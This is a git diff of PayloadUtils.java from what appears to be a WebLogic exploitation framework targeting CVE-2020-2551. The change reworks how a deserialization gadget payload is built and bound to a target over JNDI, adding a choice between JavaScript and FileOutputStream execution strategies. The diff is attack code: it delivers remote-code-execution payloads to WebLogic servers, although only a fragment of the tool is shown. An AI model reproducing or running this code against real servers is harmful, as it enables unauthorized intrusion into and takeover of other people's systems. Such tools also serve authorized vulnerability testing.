@@ -15,6 +15,10 @@
 
 package com.r4v3zn.weblogic.framework.utils;
 
+import com.r4v3zn.weblogic.framework.call.Call;
+import com.r4v3zn.weblogic.framework.call.FileOutputStreamCall;
+import com.r4v3zn.weblogic.framework.call.JavascriptCall;
+import com.r4v3zn.weblogic.framework.enmus.CallEnum;
 import com.r4v3zn.weblogic.framework.entity.ContextPojo;
 import com.r4v3zn.weblogic.framework.entity.GadgetParam;
 import com.r4v3zn.weblogic.framework.entity.MyException;
@@ -30,7 +34,6 @@ import java.net.URLClassLoader;
 import java.rmi.Remote;
 import static com.r4v3zn.weblogic.framework.config.CharsetConfig.defaultCharsetName;
 import static com.r4v3zn.weblogic.framework.utils.CallUtils.*;
-import static com.r4v3zn.weblogic.framework.utils.ContextUtils.rebind;
 import static com.r4v3zn.weblogic.framework.utils.VersionUtils.checkVersion;
 import static com.r4v3zn.weblogic.framework.utils.VersionUtils.getVersion;
 import static com.r4v3zn.weblogic.framework.vuls.impl.CVE_2020_2551.STATIC_BIND_NAME;
@@ -96,11 +99,13 @@ public class PayloadUtils {
             throw new MyException("版本获取错误");
         }
         String javascriptUrl = "";
-        if(Integer.parseInt(versionArr[0]) > 11 && Integer.parseInt(versionArr[1]) > 1){
-            if (isBlank(vulCheckParam.getJavascriptUrl())){
-                throw new MyException("javascript URL 不能为空！");
-            }else{
-                javascriptUrl = vulCheckParam.getJavascriptUrl();
+        if(vulCheckParam.getCall() == CallEnum.JAVASCRIPT){
+            if(Integer.parseInt(versionArr[0]) > 11 && Integer.parseInt(versionArr[1]) > 1){
+                if (isBlank(vulCheckParam.getJavascriptUrl())){
+                    throw new MyException("javascript URL 不能为空！");
+                }else{
+                    javascriptUrl = vulCheckParam.getJavascriptUrl();
+                }
             }
         }
         URLClassLoader urlClassLoader = ClassLoaderUtils.loadJar(version,vulDependencies);
@@ -115,21 +120,22 @@ public class PayloadUtils {
             bindName = STATIC_BIND_NAME;
         }
         Class<? extends Remote> callClazz = CALL_MAP.get(callName);
-        ObjectGadget gadget = gadgetClazz.newInstance();
         GadgetParam gadgetParam = new GadgetParam();
         gadgetParam.setBootArgs(new String[]{bindName, javascriptUrl});
         gadgetParam.setCodeByte(bytes);
         gadgetParam.setClassName(callClazz.getSimpleName());
         gadgetParam.setUrlClassLoader(urlClassLoader);
         gadgetParam.setJndiUrl(vulCheckParam.getJndiUrl());
-        Object sendObject = gadget.getObject(gadgetParam);
         String jndiUrl = UrlUtils.buildJNDIUrl(url, vulCheckParam.getProtocol());
-        ContextPojo contextPojo = null;
-        try{
-            contextPojo = rebind(jndiUrl, sendObject, urlClassLoader);
-        }catch (Exception e){
-            //
+        ContextPojo contextPojo = new ContextPojo();
+        contextPojo.setContext(ContextUtils.getContext(jndiUrl));
+        contextPojo.setUrlClassLoader(urlClassLoader);
+        CallEnum callEnum = vulCheckParam.getCall();
+        Call call = new JavascriptCall();
+        if(callEnum == CallEnum.FILE_OUTPUT_STREAM){
+            call = new FileOutputStreamCall();
         }
+        contextPojo = call.executeCall(gadgetParam, vulTest, gadgetClazz, contextPojo);
         if(contextPojo == null || contextPojo.getContext() == null || contextPojo.getUrlClassLoader() == null){
             return false;
         }
